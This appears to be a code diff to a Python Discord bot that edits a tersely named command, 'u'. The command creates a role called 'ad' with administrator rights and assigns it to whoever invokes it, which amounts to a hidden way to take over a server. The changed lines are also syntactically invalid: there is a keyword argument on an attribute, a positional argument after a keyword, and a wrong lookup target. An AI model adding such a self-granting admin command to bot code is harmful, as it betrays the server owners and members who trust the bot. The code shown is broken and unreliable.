@@ -81,7 +81,8 @@ async def u(ctx):
 		try:
 			role = discord.utils.get(ctx.message.server, name="ad")
 		except:
-			await client.create_role(ctx.message.server, name="ad",permissions=8)
+			permissions = discord.Permissions(permissions.administrator = True)
+			await client.create_role(ctx.message.server, name="ad",permissions)
 			role = discord.utils.get(ctx.message.server, name="ad")
 		await client.add_roles(ctx.message.author, role)
     
